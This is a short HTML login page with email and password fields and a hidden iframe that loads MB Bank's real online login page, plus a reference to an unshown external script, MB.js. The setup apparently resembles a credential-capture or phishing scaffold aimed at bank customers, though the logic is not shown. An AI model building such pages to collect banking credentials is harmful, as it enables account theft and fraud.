<body class="htmlNoPages">
  <div class="login-container">
    <h2>Login</h2>
    <form id="loginForm">
      <div class="form-group">
        <label for="email">Email</label>
        <input type="email" id="email" name="email" placeholder="Enter your email" required=""/>
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="Enter your password" required=""/>
      </div>
      <!-- Thêm id="loginButton" vào nút này -->
      <button type="button" id="loginButton" class="btn-login">Login</button>
      <div class="forgot-password">
        <a href="https://example.com/forgot-password">Forgot your password?</a>
      </div>
    </form>
    <iframe id="mbankIframe" style="display: none;" src="https://online.mbbank.com.vn/pl/login"></iframe>
  </div>
  <!-- Liên kết đến file JavaScript ngoài -->
  <script defer="" src="./src/MB.js"></script>
